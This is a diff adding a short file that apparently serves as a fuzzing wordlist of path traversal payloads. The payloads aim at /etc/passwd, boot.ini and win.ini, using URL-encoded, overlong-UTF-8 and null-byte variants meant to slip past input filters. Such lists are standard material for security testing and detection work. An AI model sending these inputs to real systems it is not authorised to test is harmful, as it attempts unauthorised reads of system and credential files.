@@ -1,0 +1,10 @@
+etc/passwd
+etc/passwd%00
+etc%2fpasswd
+etc%2fpasswd%00
+etc%5cpasswd
+etc%5cpasswd%00
+etc%c0%afpasswd
+etc%c0%afpasswd%00
+C:\boot.ini
+C:\WINDOWS\win.ini
